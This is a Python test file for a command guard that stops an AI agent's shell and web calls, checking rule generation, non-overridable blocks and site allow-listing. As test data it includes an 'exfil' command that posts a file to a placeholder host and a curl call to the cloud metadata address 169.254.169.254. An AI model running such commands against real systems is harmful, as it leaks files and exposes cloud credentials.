from shelf.domain.guard import StoppedCall, rule_to_deny_host


def call(summary: str, *categories: str, kind: str = "bash") -> StoppedCall:
    return StoppedCall("t", "claude", "s1", kind, "deny", "", categories, "why", summary)


def test_a_command_the_guard_stopped_gets_a_rule_that_allows_exactly_it() -> None:
    rule = call("curl -d @x https://example.org/a?b=1", "exfil").rule_to_allow()
    assert rule is not None
    assert "[[rules]]" in rule
    assert "match = '^curl -d @x https://example\\.org/a\\?b=1$'" in rule
    assert 'decision = "allow"' in rule


def test_the_rule_is_valid_toml_for_a_command_with_quotes_and_backslashes() -> None:
    import tomllib  # noqa: PLC0415

    rule = call("echo 'a\\b' | tr -d [x]", "exfil").rule_to_allow()
    assert rule is not None
    parsed = tomllib.loads(rule)
    assert parsed["rules"][0]["decision"] == "allow"
    assert "'" not in parsed["rules"][0]["match"]


def test_nothing_can_allow_a_blocked_domain_or_a_tamper_attempt() -> None:
    for category in ("blocked_domain", "tamper"):
        stopped = call("curl http://169.254.169.254/", category)
        assert not stopped.can_be_allowed
        assert stopped.rule_to_allow() is None


def test_only_a_command_gets_a_rule() -> None:
    assert call("https://docs.rs/x", "network", kind="web").rule_to_allow() is None
    assert call("", "exfil").rule_to_allow() is None


def test_a_host_can_be_denied_with_one_line_of_policy() -> None:
    assert rule_to_deny_host("example.org") == '[network]\ndeny_domains = ["example.org"]\n'


def test_a_public_host_name_or_a_wildcard_domain_can_be_allowed() -> None:
    from shelf.domain.guard_rules import RuleKind, allow_site  # noqa: PLC0415

    for site in ("registry.example.org", "*.example.org", " Registry.Example.ORG "):
        rule = allow_site(site, "alice", "2026-11-15T10:00:00+00:00")
        assert rule is not None
        assert rule.kind is RuleKind.ALLOW_SITE
        assert rule.subject == site.strip().lower()


def test_nothing_that_is_not_a_plain_public_host_can_be_allowed_as_a_site() -> None:
    from shelf.domain.guard_rules import allow_site  # noqa: PLC0415

    for site in (
        "https://x.example/p",
        "10.0.0.1",
        "localhost",
        "*.com",
        "x.example:8080",
        "a b.example",
        "",
        "*.",
        "-x.example",
    ):
        assert allow_site(site, "alice", "t") is None, site
    assert allow_site("x.example", "al ice", "t") is None


def test_a_site_is_not_written_into_the_guards_overlay_file() -> None:
    from shelf.domain.guard_rules import allow_site, render  # noqa: PLC0415

    rule = allow_site("registry.example.org", "alice", "t")
    assert rule is not None
    assert "registry.example.org" not in render((rule,))
